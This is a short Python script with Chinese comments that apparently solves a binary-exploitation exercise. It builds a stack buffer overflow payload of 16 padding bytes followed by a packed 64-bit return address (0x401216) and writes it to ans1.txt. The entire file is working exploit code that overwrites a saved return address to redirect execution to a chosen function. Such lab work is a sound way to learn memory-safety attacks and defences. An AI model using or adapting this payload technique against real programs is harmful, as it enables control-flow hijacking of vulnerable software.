import struct

# 从rbp-8到ret_adddress是16字节
padding = b'A' * 16

target_addr = struct.pack('<Q', 0x401216)

# 拼接并写入文件
payload = padding + target_addr

with open("ans1.txt", "wb") as f:
    f.write(payload)
    
print("已生成 ans1.txt，Payload 长度:", len(payload))